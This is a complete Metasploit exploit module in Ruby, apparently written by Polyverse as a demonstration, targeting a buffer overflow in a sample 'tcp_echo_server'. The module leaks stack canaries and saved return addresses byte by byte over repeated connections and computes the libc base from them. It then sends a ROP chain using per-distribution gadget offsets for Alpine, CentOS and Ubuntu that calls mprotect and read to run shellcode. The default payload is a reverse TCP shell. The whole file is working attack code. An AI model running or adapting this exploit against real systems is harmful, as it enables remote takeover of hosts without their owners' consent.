class MetasploitModule < Msf::Exploit::Remote
    Rank = ManualRanking

    include Msf::Exploit::Remote::Tcp

    module StackColumn
        RAW = 0 # Stack column containing raw bytes
        IDX = 1 # Stack column containing start index
        VAL = 2 # Stack column containing correct-endian value
    end

    module Target
	Alpine = 0 # Alpine 3.6
        Centos = 1 # Centos 7
	Trusty = 2 # Ubuntu 14.04
	Xenial = 3 # Ubuntu 16.04
	Zesty  = 4 # Ubuntu 17.04
    end

    def initialize(info = {})
        super(
            update_info(
                info,
                'Name'        => 'Polyverse tcp_echo_server example',
                'Description' => 'This is a module for exploiting a buffer overflow in tcp_echo_server',
                'Author'      => 'Polyverse Corp.',
                'References'  =>
                [
                    [ 'URL', 'https://polyverse.io' ],
                ],
                'Platform'    => 'linux',
                'Payload'     => {},
                'Arch'        => [ARCH_X64],
                'Targets'     => 
                [
                    [
                        'Linux x64 (Alpine 3.6)',
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.5,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x000036, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x01d92e, # readelf -s /lib/ld-musl-x86_64.so.1 | grep __libc_start_main
                            'o_libc_mprotect' => 0x035ba3, # readelf -s /lib/ld-musl-x86_64.so.1 | grep mprotect
                            'o_libc_read'     => 0x056c5d, # readelf -s /lib/ld-musl-x86_64.so.1 | grep read
                            'o_libc_poprdi'   => 0x037801, # offset to gadget "pop rdi" in /lib/ld-musl-x86_64.so.1
                            'o_libc_poprsi'   => 0x046854, # offset to gadget "pop rsi" in /lib/ld-musl-x86_64.so.1
                            'o_libc_poprdx'   => 0x021202, # offset to gadget "pop rdx" in /lib/ld-musl-x86_64.so.1

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000
                        }
                    ],
                    [
                        'Linux x64 (Centos 7)',            # Known to work with Centos 7.4.1708
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.5,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x0000f5, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x021b10, # readelf -s /usr/lib64/libc-2.17.so | grep __libc_start_main
                            'o_libc_mprotect' => 0x0f2a50, # readelf -s /usr/lib64/libc-2.17.so | grep mprotect
                            'o_libc_read'     => 0x0e97d0, # readelf -s /usr/lib64/libc-2.17.so | grep read
                            'o_libc_poprdi'   => 0x12a802, # offset to gadget "pop rdi" in /usr/lib64/libc-2.17.so
                            'o_libc_poprsi'   => 0x0af80c, # offset to gadget "pop rsi" in /usr/lib64/libc-2.17.so
                            'o_libc_poprdx'   => 0x0ba7e0, # offset to gadget "pop rdx" in /usr/lib64/libc-2.17.so

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000
                        }
                    ],
                    [
                        'Linux x64 (Ubuntu 14.04.4 (trusty))',
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.5,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x0000f5, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x021e50, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
                            'o_libc_mprotect' => 0x0f8550, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
                            'o_libc_read'     => 0x0ef320, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
                            'o_libc_poprdi'   => 0x0f0800, # offset to gadget "pop rdi" in libc.so.6
                            'o_libc_poprsi'   => 0x0e780b, # offset to gadget "pop rsi" in libc.so.6
                            'o_libc_poprdx'   => 0x0c0d40, # offset to gadget "pop rdx" in libc.so.6

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000

                         }
                    ],
                    [
                        'Linux x64 (Ubuntu 16.04.4 (xenial))',
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.3,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x0000f0, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x020740, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
                            'o_libc_mprotect' => 0x101730, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
                            'o_libc_read'     => 0x0f7220, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
                            'o_libc_poprdi'   => 0x0e8808, # offset to gadget "pop rdi" in libc.so.6
                            'o_libc_poprsi'   => 0x07b802, # offset to gadget "pop rsi" in libc.so.6
                            'o_libc_poprdx'   => 0x001b96, # offset to gadget "pop rdx" in libc.so.6

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000

                         }
                    ],
                    [
                        'Linux x64 (Ubuntu 17.04.4 (zesty))',
                        {
                            'Arch'            => ARCH_X64,

			    'n_sleep_s'       => 0.5,      # Wait time, in seconds, between write/read pairs

                            'o_libc_lcsmr'    => 0x0000f1, # main return-to offset in __libc_start_main
                            'o_libc_lcsm'     => 0x020300, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep __libc_start_main
                            'o_libc_mprotect' => 0x102ca0, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep mprotect
                            'o_libc_read'     => 0x0f8880, # readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep read
                            'o_libc_poprdi'   => 0x0752ac, # offset to gadget "pop rdi" in libc.so.6
                            'o_libc_poprsi'   => 0x0b6807, # offset to gadget "pop rsi" in libc.so.6
                            'o_libc_poprdx'   => 0x116d46, # offset to gadget "pop rdx" in libc.so.6

                            's_stack_free'    => 0x010000, # save area to be putting our shellcode
                            's_stack_exec'    => 0x005000, # amount of stack to make executable
                            's_stack_length'  => 0x020000  # observed 0x21000

                         }
                    ]
                ],
                'DefaultTarget'  => Target::Centos, # This is an index into the array 'Targets" above
                'DefaultOptions' => {
                    'PAYLOAD' => 'linux/x64/shell_reverse_tcp'
                }
            )
        )

        register_options(
        [
            Opt::LPORT(5555),
            Opt::RPORT(8080),
	    OptBool.new('EXHAUSTIVE', [false, 'Exhaustive stack disclosure', false]),
	    OptBool.new('INTERACTIVE', [false, 'Interactive mode for live audiences and video generation.', false])
        ])
    end

    # Returns that the remote host is always vulnerable
    def check
        result = Exploit::CheckCode::Vulnerable

        return result
    end

    def exploit
        print_status("Start...")

        if check() != Exploit::CheckCode::Vulnerable
            print_error("check() failed")
            return
        end

        # Presently, this converter assumes little-endian
        def str_to_int(str)
            if str.length > 8
                return nil
            end

            n = 0
            for i in 1..str.length
                if Rex::Arch.endian(target.arch) == ENDIAN_LITTLE
                    n = (n << 8) + str[str.length - i].ord
                else
                    n = (n << 8) + str[i - 1].ord
                end
            end

            return n
        end

        # Formatter for binary string to hex string
        def str_to_str16(str)
            return str.unpack('H*')
        end

        # Formatter for int to hex string
        def int_to_str16(i)
            return "0x" + i.to_s(16)
        end

        # Print utility for a header
        def print_header(hdr)
            print_status("-----------------------------------------------------------------------------------")
            print_status("#{hdr}") 
            print_status("-----------------------------------------------------------------------------------")
        end

        # Print utility for a separator
        def print_separator()
            print_status("- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -")
        end

        # Leak the next n characters
        def probe(n, buf)
            for i in 1..n
                connect
                sock.write buf 
                sleep target['n_sleep_s']
                buf = sock.read(buf.length+1)
                disconnect
            end

            return buf[-n, n], buf.length - n, str_to_int(buf[-n, n]), buf
        end

        def probe_field(key, n, buf, stack)
            stack[key] = Array.new(3)
            stack[key][StackColumn::RAW], stack[key][StackColumn::IDX], stack[key][StackColumn::VAL], buf = probe(n, buf)

	    s = "[buffer+#{stack[key][StackColumn::IDX].to_s()}] "
	    s += " " if stack[key][StackColumn::IDX] < 100
	    s += "#{key}: ".ljust(29)
	    s += "#{str_to_str16(stack[key][StackColumn::RAW])}".ljust(21)
	    s += "(#{int_to_str16(stack[key][StackColumn::VAL])})" if stack[key][StackColumn::VAL] != nil

            print_status(s)

            return buf, stack
        end

        def interact(step, action)
	    print_status()
	    print_status("STEP #{step}: #{datastore['INTERACTIVE'] ? "Press <Enter>" : "Proceed"} to #{action}")
	    if datastore['INTERACTIVE']
		exit() if gets[0].chomp().downcase() == 'q'
	    end

	    return step + 1
        end

        # Initialize
	step = 1
        stack = {}

        # Start looking beyond the 80 byte buffer
        buf = "01234567890123456789012345678901234567890123456789012345678901234567890123456789"

        # vuln_read() frame
	step = interact(step, "leak the (partial) stack frame for vuln_read().")
        print_header("STACK FRAME: vuln_read(client_fd)")
        buf, stack = probe_field("vuln_read_padding",           8, buf, stack)
        buf, stack = probe_field("vuln_read_canary",            8, buf, stack)
        print_separator()
        buf, stack = probe_field("vuln_read_saved_rbp",         8, buf, stack)
        buf, stack = probe_field("vuln_read_saved_rip",         8, buf, stack)

        # main() frame
	step = interact(step, "leak the stack frame for main().")
        print_header("STACK FRAME: main(argc, argv, envp)")
        buf, stack = probe_field("main_1a",                     4, buf, stack)
        buf, stack = probe_field("main_1b",                     4, buf, stack)
        buf, stack = probe_field("main_envp",                   8, buf, stack)
        buf, stack = probe_field("main_argv",                   8, buf, stack)
        buf, stack = probe_field("main_4a",                     4, buf, stack)
        buf, stack = probe_field("main_4b",                     4, buf, stack)
        buf, stack = probe_field("main_argc",                   4, buf, stack)
        buf, stack = probe_field("main_cli_len",                4, buf, stack)
        buf, stack = probe_field("main_server_fd",              4, buf, stack)
        buf, stack = probe_field("main_client_fd",              4, buf, stack)
        buf, stack = probe_field("main_server_addr",           16, buf, stack)
        buf, stack = probe_field("main_client_addr",           16, buf, stack)
        buf, stack = probe_field("main_11",                     8, buf, stack)
        buf, stack = probe_field("main_canary",                 8, buf, stack)
        print_separator()
        buf, stack = probe_field("main_saved_rbp",              8, buf, stack)
        buf, stack = probe_field("main_saved_rip",              8, buf, stack)

	# Perform exhaustive stack decoding (if requested)
	if datastore['EXHAUSTIVE']
	    step = interact(step, "leak the stack frame for __libc_start_main().")
            print_header("STACK FRAME: __libc_start_main(main, argc, argv, init, fini, ldso_fini)")
            buf, stack = probe_field("__libc_start_main_1",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_2",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_3a",        4, buf, stack)
            buf, stack = probe_field("__libc_start_main_3b",        4, buf, stack)
            buf, stack = probe_field("__libc_start_main_4",         8, buf, stack) # main()
            buf, stack = probe_field("__libc_start_main_5",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_6",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_7",         8, buf, stack) # _start()
            buf, stack = probe_field("__libc_start_main_8",         8, buf, stack) # &argc
            buf, stack = probe_field("__libc_start_main_9",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_a",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_b",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_c",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_d",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_e",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_f",         8, buf, stack)
            buf, stack = probe_field("__libc_start_main_g",         8, buf, stack) # __libc_scu_init()
            buf, stack = probe_field("__libc_start_main_h",         8, buf, stack) # argv
            buf, stack = probe_field("__libc_start_main_i",         8, buf, stack) # argc+padding
            print_separator()
            buf, stack = probe_field("__libc_start_main_rbx",       8, buf, stack)
            buf, stack = probe_field("__libc_start_main_rbp",       8, buf, stack)
            buf, stack = probe_field("__libc_start_main_r12",       8, buf, stack) # _start()
            buf, stack = probe_field("__libc_start_main_r13",       8, buf, stack) # &argc
            buf, stack = probe_field("__libc_start_main_r14",       8, buf, stack)
            buf, stack = probe_field("__libc_start_main_saved_rip", 8, buf, stack)

            # _start() frame
	    step = interact(step, "leak the stack frame for __start().")
            print_header("STACK FRAME: _start()")
            buf, stack = probe_field("_start_rsp", 8, buf, stack)
            buf, stack = probe_field("_start_rax", 8, buf, stack)
	end

        # Compute the base address of libc
        a_libc_base = stack["main_saved_rip"][StackColumn::VAL] - target['o_libc_lcsmr'] - target['o_libc_lcsm']

        # Compute the absolute addresses of ROP'y things from offsets into libc
        a_libc_mprotect = a_libc_base + target['o_libc_mprotect'] # Address of mprotect()
        a_libc_read     = a_libc_base + target['o_libc_read']     # Address of read()
        a_libc_poprdi   = a_libc_base + target['o_libc_poprdi']   # Address of gadget "pop rdi; ret"
        a_libc_poprsi   = a_libc_base + target['o_libc_poprsi']   # Address of gadget "pop rsi; ret"
        a_libc_poprdx   = a_libc_base + target['o_libc_poprdx']   # Address of gadget "pop rdx; ret"

	# Compute the stack addresses that we will need
        a_stack_top     = (stack["vuln_read_saved_rbp"][StackColumn::VAL] + 4095) & 0x7ffffffff000
        a_stack_free    = a_stack_top - target['s_stack_free']    # Address of safe place for our payload

        # Print out our understanding of the situation
	step = interact(step, "compute required absolute addresses.")
        print_header("COMPUTED ADDRESSES")
        print_status("a_libc_base:       #{int_to_str16(a_libc_base)}")
        print_status("a_stack_top:       #{int_to_str16(a_stack_top)}")
        print_status("a_stack_free:      #{int_to_str16(a_stack_free)}")
        print_status("a_libc_mprotect:   #{int_to_str16(a_libc_mprotect)}")
        print_status("a_libc_read:       #{int_to_str16(a_libc_read)}")
        print_status("a_libc_poprdi:     #{int_to_str16(a_libc_poprdi)}")
        print_status("a_libc_poprsi:     #{int_to_str16(a_libc_poprsi)}")
        print_status("a_libc_poprdx:     #{int_to_str16(a_libc_poprdx)}")
        print_header("COMPLETE")

        # Start with buf up to the return address
        b = buf[0, stack["vuln_read_saved_rip"][StackColumn::IDX]]

        # Make the stack writable
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, target['s_stack_exec'])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, 0x7)
        b += Rex::Arch.pack_addr(target.arch, a_libc_mprotect)

        # Read the shellcode into the unused stack allocation
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdi)
        b += Rex::Arch.pack_addr(target.arch, stack["main_client_fd"][StackColumn::VAL])
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprsi)
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)
        b += Rex::Arch.pack_addr(target.arch, a_libc_poprdx)
        b += Rex::Arch.pack_addr(target.arch, payload.encoded.length)
        b += Rex::Arch.pack_addr(target.arch, a_libc_read)

        # Return to the shellcode that we will place at a_stack_free
        b += Rex::Arch.pack_addr(target.arch, a_stack_free)

        # Exploit
	step = interact(step, "deliver exploit payload.")
        connect
        sock.write b
        sleep target['n_sleep_s']
        sock.write payload.encoded
        disconnect

        print_status("Done. (If successful, you should get a promptless shell.)")
    end
end
